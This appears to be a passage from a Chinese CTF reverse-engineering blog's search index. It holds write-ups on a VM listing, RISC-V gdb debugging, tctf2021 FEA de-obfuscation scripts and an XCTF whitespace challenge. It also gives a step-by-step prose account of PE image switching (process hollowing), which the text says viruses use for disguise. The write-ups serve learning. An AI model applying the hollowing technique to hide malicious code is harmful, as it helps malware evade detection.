== 0 jump 54 344: inputchar index -1 245: inputchar+=1 246: inputchar+=1 247: inputchar+=1 248: inputchar+=1 249: inputchar+=1 250: inputchar+=1 251: inputchar index +1 352: inputchar-=1 353: if inputchar != 0 jump 44 354: inputchar index -1 255: inputchar+=1 256: 57: inputchar+=1 258: inputchar+=1 259: 60: inputchar+=1 261: inputchar+=1 262: inputchar+=1 263: inputchar+=1 264: inputchar+=1 265: 66: inputchar-=1 267: 68: inputchar index +1 369: inputchar+=1 370: inputchar+=1 371: inputchar+=1 372: inputchar+=1 373: inputchar+=1 374: inputchar+=1 375: inputchar+=1 376: if inputchar == 0 jump 89 377: inputchar index -1 278: inputchar-=1 279: inputchar-=1 280: inputchar-=1 281: inputchar-=1 282: inputchar-=1 283: inputchar-=1 284: inputchar-=1 285: inputchar-=1 286: inputchar index +1 387: inputchar-=1 388: if inputchar != 0 jump 77 389: inputchar index -1 290: inputchar-=1 291: inputchar-=1 292: 93: if inputchar == 0 jump 96 294: inputchar-=1 295: if inputchar != 0 jump 94 296: inputchar+=1 297: inputchar index +1 398: inputchar index -1 299: inputchar index +1 3100: if inputchar == 0 jump 103 3101: inputchar-=1 3102: if inputchar != 0 jump 101 3103: inputchar index -1 2104: inputchar index -1 1105: if inputchar == 0 jump 108 1106: inputchar-=1 1107: if inputchar != 0 jump 106 1108: inputchar index +1 2109: if inputchar == 0 jump 118 2110: inputchar index +1 3111: inputchar+=1 3112: inputchar index -1 2113: inputchar index -1 1114: inputchar+=1 1115: inputchar index +1 2116: inputchar-=1 2117: if inputchar != 0 jump 110 2118: inputchar index +1 3119: if inputchar == 0 jump 125 3120: inputchar index -1 2121: inputchar+=1 2122: inputchar index +1 3123: inputchar-=1 3124: if inputchar != 0 jump 120 3125: inputchar index -1 2126: inputchar index +1 3127: inputchar index -1 2128: if inputchar == 0 jump 131 2129: inputchar-=1 2130: if inputchar != 0 jump 129 2131: inputchar index +1 3132: inputchar index -1 2133: input 2134: inputchar index +1 3135: if inputchar == 0 jump 138 3136: inputchar-=1 3137: if inputchar != 0 jump 136 3138: inputchar index +1 4139: if inputchar == 0 jump 142 4140: inputchar-=1 4141: if inputchar != 0 jump 140 4142: inputchar+=1 4143: inputchar+=1 4144: inputchar+=1 4145: inputchar+=1 4146: inputchar+=1 4147: inputchar+=1 4148: inputchar+=1 4149: if inputchar == 0 jump 165 4150: inputchar index -1 3151: inputchar+=1 3152: inputchar+=1 3153: inputchar+=1 3154: inputchar+=1 3155: inputchar+=1 3156: inputchar+=1 3157: inputchar+=1 3158: inputchar+=1 3159: inputchar+=1 3160: inputchar+=1 3161: inputchar+=1 3162: inputchar index +1 4163: inputchar-=1 4164: if inputchar != 0 jump 150 4165: inputchar index -1 3166: inputchar index +1 4167: inputchar index -1 3168: inputchar index -1 2169: inputchar index +1 3170: if inputchar == 0 jump 176 3171: inputchar index -1 2172: inputchar-=1 2173: inputchar index +1 3174: inputchar-=1 3175: if inputchar != 0 jump 171 3176: inputchar index -1 2177: if inputchar == 0 jump 228 2178: inputchar index +1 3179: inputchar index +1 4180: if inputchar == 0 jump 183 4181: inputchar-=1 4182: if inputchar != 0 jump 181 4183: inputchar index +1 5184: inputchar index -1 4185: inputchar index +1 5186: if inputchar == 0 jump 189 5187: inputchar-=1 5188: if inputchar != 0 jump 187 5189: inputchar index -1 4190: inputchar index -1 3191: inputchar index -1 2192: inputchar index -1 1193: if inputchar == 0 jump 196 1194: inputchar-=1 1195: if inputchar != 0 jump 194 1196: inputchar index +1 2197: inputchar index +1 3198: inputchar index +1 4199: if inputchar == 0 jump 212 4200: inputchar index +1 5201: inputchar+=1 5202: inputchar index -1 4203: inputchar index -1 3204: inputchar index -1 2205: inputchar index -1 1206: inputchar+=1 1207: inputchar index +1 2208: inputchar index +1 3209: inputchar index +1 4210: inputchar-=1 4211: if inputchar != 0 jump 200 4212: inputchar index +1 5213: if inputchar == 0 jump 219 5214: inputchar index -1 4215: inputchar+=1 4216: inputchar index +1 5217: inputchar-=1 5218: if inputchar != 0 jump 214 5219: inputchar index -1 4220: inputchar index +1 5221: inputchar index -1 4222: inputchar index -1 3223: inputchar index -1 2224: if inputchar == 0 jump 227 2225: inputchar-=1 2226: if inputchar != 0 jump 225 2227: if inputchar != 0 jump 178 2228: if inputchar == 0 jump 231 2229: inputchar-=1 2230: if inputchar != 0 jump 229 2231: inputchar index +1 3232: inputchar index -1 2233: input 2234: inputchar index +1 3235: if inputchar == 0 jump 238 3236: inputchar-=1 3237: if inputchar != 0 jump 236 3238: inputchar index +1 4239: if inputchar == 0 jump 242 4240: inputchar-=1 4241: if inputchar != 0 jump 240 4242: inputchar+=1 4243: inputchar+=1 4244: inputchar+=1 4245: inputchar+=1 4246: inputchar+=1 4247: inputchar+=1 4248: if inputchar == 0 jump 262 4249: inputchar index -1 3250: inputchar+=1 3251: inputchar+=1 3252: inputchar+=1 3253: inputchar+=1 3254: inputchar+=1 3255: inputchar+=1 3256: inputchar+=1 3257: inputchar+=1 3258: inputchar+=1 3259: inputchar index +1 4260: inputchar-=1 4261: if inputchar != 0 jump 249 4262: inputchar index -1 3263: inputchar-=1 3264: inputchar index +1 4265: inputchar index -1 3266: inputchar index -1 2267: inputchar index +1 3268: if inputchar == 0 jump 274 3269: inputchar index -1 2270: inputchar-=1 2271: inputchar index +1 3272: inputchar-=1 3273: if inputchar != 0 jump 269 3274: inputchar index -1 2275: if inputchar == 0 jump 326 2276: inputchar index +1 3277: inputchar index +1 4278: if inputchar == 0 jump 281 4279: inputchar-=1 4280: if inputchar != 0 jump 279 4281: inputchar index +1 5282: inputchar index -1 4283: inputchar index +1 5284: if inputchar == 0 jump 287 5285: inputchar-=1 5286: if inputchar != 0 jump 285 5287: inputchar index -1 4288: inputchar index -1 3289: inputchar index -1 2290: inputchar index -1 1291: if inputchar == 0 jump 294 1292: inputchar-=1 1293: if inputchar != 0 jump 292 1294: inputchar index +1 2295: inputchar index +1 3296: inputchar index +1 4297: if inputchar == 0 jump 310 4298: inputchar index +1 5299: inputchar+=1 5300: inputchar index -1 4301: inputchar index -1 3302: inputchar index -1 2303: inputchar index -1 1304: inputchar+=1 1305: inputchar index +1 2306: inputchar index +1 3307: inputchar index +1 4308: inputchar-=1 4309: if inputchar != 0 jump 298 4310: inputchar index +1 5311: if inputchar == 0 jump 317 5312: inputchar index -1 4313: inputchar+=1 4314: inputchar index +1 5315: inputchar-=1 5316: if inputchar != 0 jump 312 5317: inputchar index -1 4318: inputchar index +1 5319: inputchar index -1 4320: inputchar index -1 3321: inputchar index -1 2322: if inputchar == 0 jump 325 2323: inputchar-=1 2324: if inputchar != 0 jump 323 2325: if inputchar != 0 jump 276 2326: if inputchar == 0 jump 329 2327: inputchar-=1 2328: if inputchar != 0 jump 327 2329: inputchar index +1 3330: inputchar index -1 2331: input 2332: inputchar index +1 3333: if inputchar == 0 jump 336 3334: inputchar-=1 3335: if inputchar != 0 jump 334 3336: inputchar index +1 4337: if inputchar == 0 jump 340 4338: inputchar-=1 4339: if inputchar != 0 jump 338 4340: inputchar+=1 4341: inputchar+=1 4342: inputchar+=1 4343: inputchar+=1 4344: inputchar+=1 4345: inputchar+=1 4346: inputchar+=1 4347: inputchar+=1 4348: if inputchar == 0 jump 364 4349: inputchar index -1 3350: inputchar+=1 3351: inputchar+=1 3352: inputchar+=1 3353: inputchar+=1 3354: inputchar+=1 3355: inputchar+=1 3356: inputchar+=1 3357: inputchar+=1 3358: inputchar+=1 3359: inputchar+=1 3360: inputchar+=1 3361: inputchar index +1 4362: inputchar-=1 4363: if inputchar != 0 jump 349 4364: inputchar index -1 3365: inputchar+=1 3366: inputchar index +1 4367: inputchar index -1 3368: inputchar index -1 2369: inputchar index +1 3370: if inputchar == 0 jump 376 3371: inputchar index -1 2372: inputchar-=1 2373: inputchar index +1 3374: inputchar-=1 3375: if inputchar != 0 jump 371 3376: inputchar index -1 2377: if inputchar == 0 jump 428 2378: inputchar index +1 3379: inputchar index +1 4380: if inputchar == 0 jump 383 4381: inputchar-=1 4382: if inputchar != 0 jump 381 4383: inputchar index +1 5384: inputchar index -1 4385: inputchar index +1 5386: if inputchar == 0 jump 389 5387: inputchar-=1 5388: if inputchar != 0 jump 387 5389: inputchar index -1 4390: inputchar index -1 3391: inputchar index -1 2392: inputchar index -1 1393: if inputchar == 0 jump 396 1394: inputchar-=1 1395: if inputchar != 0 jump 394 1396: inputchar index +1 2397: inputchar index +1 3398: inputchar index +1 4399: if inputchar == 0 jump 412 4400: inputchar index +1 5401: inputchar+=1 5402: inputchar index -1 4403: inputchar index -1 3404: inputchar index -1 2405: inputchar index -1 1406: inputchar+=1 1407: inputchar index +1 2408: inputchar index +1 3409: inputchar index +1 4410: inputchar-=1 4411: if inputchar != 0 jump 400 4412: inputchar index +1 5413: if inputchar == 0 jump 419 5414: inputchar index -1 4415: inputchar+=1 4416: inputchar index +1 5417: inputchar-=1 5418: if inputchar != 0 jump 414 5419: inputchar index -1 4420: inputchar index +1 5421: inputchar index -1 4422: inputchar index -1 3423: inputchar index -1 2424: if inputchar == 0 jump 427 2425: inputchar-=1 2426: if inputchar != 0 jump 425 2427: if inputchar != 0 jump 378 2428: if inputchar == 0 jump 431 2429: inputchar-=1 2430: if inputchar != 0 jump 429 2431: inputchar index +1 3432: inputchar index -1 2433: input 2434: inputchar index +1 3435: if inputchar == 0 jump 438 3436: inputchar-=1 3437: if inputchar != 0 jump 436 3438: inputchar index +1 4439: if inputchar == 0 jump 442 4440: inputchar-=1 4441: if inputchar != 0 jump 440 4442: inputchar+=1 4443: inputchar+=1 4444: inputchar+=1 4445: inputchar+=1 4446: inputchar+=1 4447: inputchar+=1 4448: inputchar+=1 4449: inputchar+=1 4450: if inputchar == 0 jump 467 4451: inputchar index -1 3452: inputchar+=1 3453: inputchar+=1 3454: inputchar+=1 3455: inputchar+=1 3456: inputchar+=1 3457: inputchar+=1 3458: inputchar+=1 3459: inputchar+=1 3460: inputchar+=1 3461: inputchar+=1 3462: inputchar+=1 3463: inputchar+=1 3464: inputchar index +1 4465: inputchar-=1 4466: if inputchar != 0 jump 451 4467: inputchar index -1 3468: inputchar+=1 3469: inputchar index +1 4470: inputchar index -1 3471: inputchar index -1 2472: inputchar index +1 3473: if inputchar == 0 jump 479 3474: inputchar index -1 2475: inputchar-=1 2476: inputchar index +1 3477: inputchar-=1 3478: if inputchar != 0 jump 474 3479: inputchar index -1 2480: if inputchar == 0 jump 531 2481: inputchar index +1 3482: inputchar index +1 4483: if inputchar == 0 jump 486 4484: inputchar-=1 4485: if inputchar != 0 jump 484 4486: inputchar index +1 5487: inputchar index -1 4488: inputchar index +1 5489: if inputchar == 0 jump 492 5490: inputchar-=1 5491: if inputchar != 0 jump 490 5492: inputchar index -1 4493: inputchar index -1 3494: inputchar index -1 2495: inputchar index -1 1496: if inputchar == 0 jump 499 1497: inputchar-=1 1498: if inputchar != 0 jump 497 1499: inputchar index +1 2500: inputchar index +1 3501: inputchar index +1 4502: if inputchar == 0 jump 515 4503: inputchar index +1 5504: inputchar+=1 5505: inputchar index -1 4506: inputchar index -1 3507: inputchar index -1 2508: inputchar index -1 1509: inputchar+=1 1510: inputchar index +1 2511: inputchar index +1 3512: inputchar index +1 4513: inputchar-=1 4514: if inputchar != 0 jump 503 4515: inputchar index +1 5516: if inputchar == 0 jump 522 5517: inputchar index -1 4518: inputchar+=1 4519: inputchar index +1 5520: inputchar-=1 5521: if inputchar != 0 jump 517 5522: inputchar index -1 4523: inputchar index +1 5524: inputchar index -1 4525: inputchar index -1 3526: inputchar index -1 2527: if inputchar == 0 jump 530 2528: inputchar-=1 2529: if inputchar != 0 jump 528 2530: if inputchar != 0 jump 481 2531: if inputchar == 0 jump 534 2532: inputchar-=1 2533: if inputchar != 0 jump 532 2534: inputchar index +1 3535: inputchar index -1 2536: input 2537: inputchar index +1 3538: if inputchar == 0 jump 541 3539: inputchar-=1 3540: if inputchar != 0 jump 539 3541: inputchar index +1 4542: if inputchar == 0 jump 545 4543: inputchar-=1 4544: if inputchar != 0 jump 543 4545: inputchar+=1 4546: inputchar+=1 4547: inputchar+=1 4548: inputchar+=1 4549: inputchar+=1 4550: if inputchar == 0 jump 566 4551: inputchar index -1 3552: inputchar+=1 3553: inputchar+=1 3554: inputchar+=1 3555: inputchar+=1 3556: inputchar+=1 3557: inputchar+=1 3558: inputchar+=1 3559: inputchar+=1 3560: inputchar+=1 3561: inputchar+=1 3562: inputchar+=1 3563: inputchar index +1 4564: inputchar-=1 4565: if inputchar != 0 jump 551 4566: inputchar index -1 3567: inputchar index +1 4568: inputchar index -1 3569: inputchar index -1 2570: inputchar index +1 3571: if inputchar == 0 jump 577 3572: inputchar index -1 2573: inputchar-=1 2574: inputchar index +1 3575: inputchar-=1 3576: if inputchar != 0 jump 572 3577: inputchar index -1 2578: if inputchar == 0 jump 629 2579: inputchar index +1 3580: inputchar index +1 4581: if inputchar == 0 jump 584 4582: inputchar-=1 4583: if inputchar != 0 jump 582 4584: inputchar index +1 5585: inputchar index -1 4586: inputchar index +1 5587: if inputchar == 0 jump 590 5588: inputchar-=1 5589: if inputchar != 0 jump 588 5590: inputchar index -1 4591: inputchar index -1 3592: inputchar index -1 2593: inputchar index -1 1594: if inputchar == 0 jump 597 1595: inputchar-=1 1596: if inputchar != 0 jump 595 1597: inputchar index +1 2598: inputchar index +1 3599: inputchar index +1 4600: if inputchar == 0 jump 613 4601: inputchar index +1 5602: inputchar+=1 5603: inputchar index -1 4604: inputchar index -1 3605: inputchar index -1 2606: inputchar index -1 1607: inputchar+=1 1608: inputchar index +1 2609: inputchar index +1 3610: inputchar index +1 4611: inputchar-=1 4612: if inputchar != 0 jump 601 4613: inputchar index +1 5614: if inputchar == 0 jump 620 5615: inputchar index -1 4616: inputchar+=1 4617: inputchar index +1 5618: inputchar-=1 5619: if inputchar != 0 jump 615 5620: inputchar index -1 4621: inputchar index +1 5622: inputchar index -1 4623: inputchar index -1 3624: inputchar index -1 2625: if inputchar == 0 jump 628 2626: inputchar-=1 2627: if inputchar != 0 jump 626 2628: if inputchar != 0 jump 579 2629: if inputchar == 0 jump 632 2630: inputchar-=1 2631: if inputchar != 0 jump 630 2632: inputchar index +1 3633: if inputchar == 0 jump 636 3634: inputchar-=1 3635: if inputchar != 0 jump 634 3636: inputchar index -1 2637: inputchar index -1 1638: if inputchar == 0 jump 647 1639: inputchar index +1 2640: inputchar+=1 2641: inputchar index +1 3642: inputchar+=1 3643: inputchar index -1 2644: inputchar index -1 1645: inputchar-=1 1646: if inputchar != 0 jump 639 1647: inputchar index +1 2648: inputchar index +1 3649: if inputchar == 0 jump 657 3650: inputchar index -1 2651: inputchar index -1 1652: inputchar+=1 1653: inputchar index +1 2654: inputchar index +1 3655: inputchar-=1 3656: if inputchar != 0 jump 650 3657: inputchar index -1 2658: if inputchar == 0 jump 707 2659: inputchar index +1 3660: inputchar index +1 4661: if inputchar == 0 jump 664 4662: inputchar-=1 4663: if inputchar != 0 jump 662 4664: inputchar index +1 5665: if inputchar == 0 jump 668 5666: inputchar-=1 5667: if inputchar != 0 jump 666 5668: inputchar index -1 4669: inputchar index +1 5670: inputchar+=1 5671: inputchar+=1 5672: inputchar+=1 5673: inputchar+=1 5674: inputchar+=1 5675: inputchar+=1 5676: inputchar+=1 5677: inputchar+=1 5678: if inputchar == 0 jump 693 5679: inputchar index -1 4680: inputchar+=1 4681: inputchar+=1 4682: inputchar+=1 4683: inputchar+=1 4684: inputchar+=1 4685: inputchar+=1 4686: inputchar+=1 4687: inputchar+=1 4688: inputchar+=1 4689: inputchar+=1 4690: inputchar index +1 5691: inputchar-=1 5692: if inputchar != 0 jump 679 5693: inputchar index -1 4694: inputchar-=1 4695: 696: inputchar-=1 4697: inputchar-=1 4698: inputchar-=1 4699: inputchar-=1 4700: 701: inputchar index -1 3702: inputchar index -1 2703: if inputchar == 0 jump 706 2704: inputchar-=1 2705: if inputchar != 0 jump 704 2706: if inputchar != 0 jump 659 2707: inputchar index -1 1708: inputchar index -1 0''' 每次输入放入 2 位置，与 3、4位置的计算结果比较","link":"/2021/07/19/CISCN2021-little-evil/"},{"title":"riscv架构的gdb调试","text":"有些逆向题会有riscv架构的，总结一下如何利用 qemu 和 gdb 调试 riscv 架构的程序 ​ riscv 架构的不能用 ida 反编译，但是 ghidra 可以 工具准备 ​ 调试 riscv 架构的程序需要准备专用的 gdb ，https://xpack.github.io/riscv-none-embed-gcc/releases/ 这里面包含各种开发工具，gdb 、gcc 、objdump…（ubuntu 的 gdb-multiarch 不支持 riscv 架构，但是其他一些系统可以） ​ 下载完后解压，进入到 bin 目录下就可以使用 gdb ​ qemu 的话直接在官网下载 ​ 如果安装的 qemu 找不到 riscv 可以参考下这个来安装 https://pdos.csail.mit.edu/6.828/2019/tools.html 调试 ​ qemu-riscv64 -g 2334 '/home/owl/桌面/main' -g 开放调试端口 ​ ./riscv-none-embed-gdb ​ 开启 gdb 后输入如下命令 ​ target remote :2334 ​ file ./main ​ 只能用原版 gdb ，gdb 插件会出错 调试时的一些指令 ​ x /10xi 0x1234：查看对应的反汇编代码 ​ info registers ：查看寄存器 ​ x /14xb 0x1234：查看内存 ​ stepi ：单步执行","link":"/2021/07/16/riscv%E6%9E%B6%E6%9E%84%E7%9A%84gdb%E8%B0%83%E8%AF%95/"},{"title":"tctf2021 FEA","text":"不算 wp，只是记录一下从这题中学习到的知识 爆破 sha2561234567891011121314151617181920import itertoolsimport hashlibimport refrom pwn import *import stringr=remote(&quot;111.186.58.164&quot;,30212)proof_of_work_line = r.recvline(keepends=False).decode(&quot;utf-8&quot;)enc = re.search('== (.*)',proof_of_work_line).group(1)strlist=itertools.product(string.ascii_letters+string.digits,repeat=4)code=&quot;&quot;key=&quot;hUsUzJ47UdPwwTns&quot;enc=&quot;ac2b009cf8ab722c6417f0dff94a24434a7d7c43f12da21a042faa34295efe22&quot;for i in strlist: code=i[0]+i[1]+i[2]+i[3] encinfo=hashlib.sha256(str(code+key).encode('utf-8')).hexdigest() if encinfo == enc: print(code) break; itertools 的简单用法1.itertools.product(‘ABCD’, repeat = 2) 排列组合（笛卡尔积） ​ 结果：AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD ​ 也可以是两个元组排列组合 2.itertools.permutations(‘ABCD’, 2) 所有可能的排列，无重复元素 ​ 结果：AB AC AD BA BC BD CA CB CD DA DB DC 3.itertools.combinations(‘ABCD’, 2) 有序，无重复元素 ​ 结果：AB AC AD BC BD CD 4.itertools.combinations_with_replacement(‘ABCD’, 2) 有序，元素可重复 ​ 结果：AA AB AC AD BB BC BD CC CD DD 用插件去除 ollvm 混淆​ 插件介绍：https://eshard.com/posts/d810_blog_post_1/ ​ 下载地址：https://gitlab.com/eshard/d810 ​ 这个插件提供多个 rules 来反混淆，也可以自己添加规则。在这题中使用了对控制流的混淆，勾选这一选项就可以实现反混淆 使用前后对比​ ​ 用idaPython去除花指令 ​ 从简化后的流程看可以知道有两处反调试，还有一处 smc 自解密 ​ smc 后 [rbp+s] 指向解密后的代码，因为代码比较长就用脚本提取出来分析 一些 idapython 函数idaapi: ​ BADADDR：4294967295 地址上界 ​ del_items(ea, flags=0, nbytes=1, may_destroy=None)：Convert item (instruction/data) to unexplored bytes ​ create_insn(ea, out=None)：Create an instruction at the specified address ​ get_first_cref_from(frm)：Get first instruction referenced from the specified instruction 123456789#提取 smc 的代码from idaapi import *start=0x00007F96D2BBB000count = 0x100000f=open('C:\\\\Users\\\\chz\\\\Desktop\\\\smc','wb')for i in range(0,count): f.write(get_byte(start+i).to_bytes(1,byteorder='big'))f.close()print(&quot;success&quot;) ​ ida 分析后有一大堆花指令，手动分析时间太久考虑用脚本去除 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#写了一半的去除部分跳转花指令，自动变code脚本import idaapiimport idcdef undefine(start,end): curr=start while curr != idaapi.BADADDR and curr &lt; end: idaapi.del_items(curr, 8) curr=curr+1def make_code(start,end): curr=start while curr != idaapi.BADADDR and curr &lt; end: insn = idaapi.insn_t() ret = idaapi.create_insn(curr, insn) if ret == 0: idaapi.del_items(curr, 8) idaapi.del_items(curr+1, 8) ret = idaapi.create_insn(curr, insn) next_ea = idaapi.get_first_cref_from(curr) if (curr&lt;end and next_ea == BADADDR) or curr==0xbf6a or curr==0x17A6F: curr = curr+1 else: curr=next_ea print(curr)def clear(start,end): curr=start while curr != idaapi.BADADDR and curr &lt; end: insn = idaapi.insn_t() if idc.GetDisasm(curr)[0:1]=='j' or idc.GetDisasm(curr)[0:4]=='call': #特定地址反汇编 jmp_addr=idc.GetOperandValue(curr,0) #获取操作数 ret = idaapi.create_insn(jmp_addr, insn) if ret == 0: idaapi.del_items(jmp_addr, 8) idaapi.del_items(jmp_addr+2, 8) idaapi.del_items(jmp_addr+4, 8) ret = idaapi.create_insn(curr, insn) next_ea = idaapi.get_first_cref_from(curr) if (curr&lt;end and next_ea == BADADDR) or curr==0xbf6a or curr==0x17A6F: curr = curr+1 else: curr=next_ea print(curr)def nop(start,end): curr=start while curr != idaapi.BADADDR and curr &lt; end: if idc.is_data(curr): idc.PatchByte(curr,0x90) next_ea = idaapi.get_first_cref_from(curr) if (curr&lt;end and next_ea == BADADDR) or curr==0xbf6a or curr==0x17A6F: curr = curr+1 else: curr=next_ea print(curr) #undefine(0x0,0x224c6)#make_code(0x0,0x224C6)#clear(0x22460,0x224c6)nop(0x0,0x224c6) ​ 但是好像写得有点太复杂了，也没法完全实现自动 patch 参考资料 https://ctftime.org/writeup/29116 python中爆破各种hash加密的新姿势 https://docs.python.org/zh-cn/3/library/itertools.html https://hex-rays.com/wp-content/static/products/ida/support/idapython_docs/ idaPython教程","link":"/2021/07/07/tctf2021-FEA/"},{"title":"PE映像切换-minilctf","text":"记录一下反调试中的 PE 映像切换技术 有关 PE 映像切换 概念 首先先以挂起的模式运行 A.exe 进程，然后将一个完全不同的 PE 文件的映像映射到 A.exe 的内存空间，并运行。A.exe 即 “外壳进程 ”，B.exe 为 “内核进程” （相当于偷梁换柱 这一技术主要用于病毒程序的伪装，反调试 具体实现过程 0x01 把 real.exe 载入内存，并创建进程 fake.exe ​ 此时进程处于挂起状态，可以自由操控内存空间 0x02 获取 fake.exe 实际加载基地址 0x03 获取 real.exe 的基地址 ​ 在 PE 文件头中获取 0x04 比较这两个基地址 1.两个基地址相同 ​ 利用 ntdll 里的 ZwUnmapViewOfSection 卸载 fake.exe 的映射,分配内存空间再将 real.exe 映射到进程内存 2.两个基地址不同 ​ 可直接将 real.exe 映射到 fake.exe 进程内存，再把 PEB.Imagebase 改为 real.exe 的基地址 0x05 修改EP ​ CONTEXT.Eax 存储 fake.exe 的 EP 地址，CONTEXT.Eip 存储 ntdll！RtlUserThreadStart 这个API的地址，通过这个API跳转到 EP 代码 miniLctf Re1 ​ 在看完上面这部分内容后突然想起来之前的 miniLctf 里的 Re1 好像有涉及这方面的知识，于是就重新分析了一下 ​ 可以根据最后修改 EP 时的地址找到 real.exe 导出分析 ​ 导出之后的解题过程就不详细叙述了应该比较简单，关注 TLS 就行 参考资料 《逆向工程核心原理》","link":"/2021/07/01/PE%E6%98%A0%E5%83%8F%E5%88%87%E6%8D%A2-minilctf/"},{"title":"XCTF Final: Spaceship","text":"对 Xctf Final Re 题： SpaceShip 的复现 初步分析​ 下载得到 ws 后缀的文件 ，谷歌查 ws 后缀文件 ​ 不过这不对，根据文件内只有空格、换行符等以及比赛时队友找到 的资料，应该是 WhiteSpace 语言 ​ 用工具可以把这个语言转成 python 和汇编形式 ​ https://github.com/Smithers888/BlueSpace 调试​ 转换得到的 python 文件可以直接运行，所以可以直接调试看逻辑 123456789101112131415161718192021222324252627282930313233343536def stssstttsttn(): stack.append(0) sys.stdout.flush() try: x = ord(sys.stdin.read(1)) except EOFError: x = -1 #x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18 = Ints('x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18') heap[stack.pop()] = x #调试时改动 stack.append(0) stack.append(0) stack[-1] = heap[stack[-1]] stack.append(16777216) x = stack.pop() stack[-1] += x stack.append(16777216) x = stack.pop() stack[-1] %= x x = stack.pop() ......... stack.append(0) stack[-1] = heap[stack[-1]] stack.append(1) stack[-1] = heap[stack[-1]] x = stack.pop() stack[-1] -= x try: if stack.pop() &lt; 0: return sttsssttssstn except Z3Exception: #异常 print(stack,heap) ​ 这部分读取并对输入进行运算，从下面这些数字猜测进行了方程的 运算 ​ 根据学长的思路可以把输入都转换成 z3 里的符号，那么在之后判 断大小的时候会因为符号不能比大小而抛出异常，就可以打印出表达式（这做法太灵活了，自己根本想不到…） 1234567891011121314151617181920212223242516777089: ((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251, 16777086: 11, 16777085: ((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#堆的数据heap ={0: 10 1: 446 2: 0, 3: 16777074 4: 16777077 5: 16777076 6: 0 8: 2 9: 10 10: 10 11: 8 12: 3 13: 11 14: 1753 15: 7 16: 17 17: 6 18: 4 19: 8 20: 16 21: 2117 22: 4 23: 5 24: 3 25: 15 26: 6 27: 6 28: 1071 29: 3 30: 17 31: 5 32: 4 33: 2 34: 16 35: 1116 36: 10 37: 14 38: 4 39: 0 40: 10 41: 9 42: 2190 43: 9 44: 14 45: 4 46: 0 47: 4 48: 9 49: 1764 50: 2 51: 3 52: 1 53: 2 54: 3 55: 1 56: 617 57: 9 58: 14 59: 8 60: 0 61: 3 62: 9 63: 2193 64: 1 65: 17 66: 5 67: 4 68: 2 69: 16 70: 866 71: 8 72: 5 73: 2 74: 15 75: 8 76: 6 77: 1594 78: 5 79: 12 80: 10 81: 13 82: 2 83: 7 84: 1153 85: 10 86: 12 87: 5 88: 13 89: 8 90: 7 91: 1737 92: 5 93: 12 94: 9 95: 13 96: 9 97: 7 98: 1445 99: 4 100: 10 101: 7 102: 8 103: 7 104: 11 105: 2119 106: 5 107: 3 108: 2 109: 2 110: 5 111: 1 112: 1237 113: 9 114: 5 115: 8 116: 15 117: 4 118: 6 119: 1463 120: 7 121: 10 122: 8 123: 8 124: 4 125: 11 126: 2217 127: 6 128: 3 129: 10 130: 2 131: 1 132: 1 133: 1871} ​ 对照着可以发现 18 个表达式的形式 exp12345678910111213((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251 ​ 因为每个变量都在可见字符范围内，所以上面的表达式可以简化成 12*x10+10*x8+3*x11== 1234567891011121314151617from z3 import *heap = {0: 10, 1: 446, 2: 0, 3: 16777074, 4: 16777077, 5: 16777076, 6: 0, 8: 2, 9: 10, 10: 10, 11: 8, 12: 3, 13: 11, 14: 1753, 15: 7, 16: 17, 17: 6, 18: 4, 19: 8, 20: 16, 21: 2117, 22: 4, 23: 5, 24: 3, 25: 15, 26: 6, 27: 6, 28: 1071, 29: 3, 30: 17, 31: 5, 32: 4, 33: 2, 34: 16, 35: 1116, 36: 10, 37: 14, 38: 4, 39: 0, 40: 10, 41: 9, 42: 2190, 43: 9, 44: 14, 45: 4, 46: 0, 47: 4, 48: 9, 49: 1764, 50: 2, 51: 3, 52: 1, 53: 2, 54: 3, 55: 1, 56: 617, 57: 9, 58: 14, 59: 8, 60: 0, 61: 3, 62: 9, 63: 2193, 64: 1, 65: 17, 66: 5, 67: 4, 68: 2, 69: 16, 70: 866, 71: 8, 72: 5, 73: 2, 74: 15, 75: 8, 76: 6, 77: 1594, 78: 5, 79: 12, 80: 10, 81: 13, 82: 2, 83: 7, 84: 1153, 85: 10, 86: 12, 87: 5, 88: 13, 89: 8, 90: 7, 91: 1737, 92: 5, 93: 12, 94: 9, 95: 13, 96: 9, 97: 7, 98: 1445, 99: 4, 100: 10, 101: 7, 102: 8, 103: 7, 104: 11, 105: 2119, 106: 5, 107: 3, 108: 2, 109: 2, 110: 5, 111: 1, 112: 1237, 113: 9, 114: 5, 115: 8, 116: 15, 117: 4, 118: 6, 119: 1463, 120: 7, 121: 10, 122: 8, 123: 8, 124: 4, 125: 11, 126: 2217, 127: 6, 128: 3, 129: 10, 130: 2, 131: 1, 132: 1, 133: 1871}s=Solver()x=IntVector('x',18)for i in range(8,7*18+8,7): s.add(heap[i]*(x[heap[i+1]]) +heap[i+2]*(x[heap[i+3]]) +heap[i+4]*(x[heap[i+5]])==heap[i+6]) print(s.check())print(s.model())ans=s.model()x10,x8,x11=Ints('x10 x8 x11')[print(chr(int(str(ans[i]))),end='') for i in x]#xctf{Wh1t3sym3x!?} ​ ​ 复现得到 flag 后还在谷歌上找到了有人在赛时写了个类似 angr 的对 whitespace 自动求解的 库，有空再研究 ​ https://github.com/umutoztunc/whitesymex 参考资料 https://zh.wikipedia.org/wiki/Whitespace 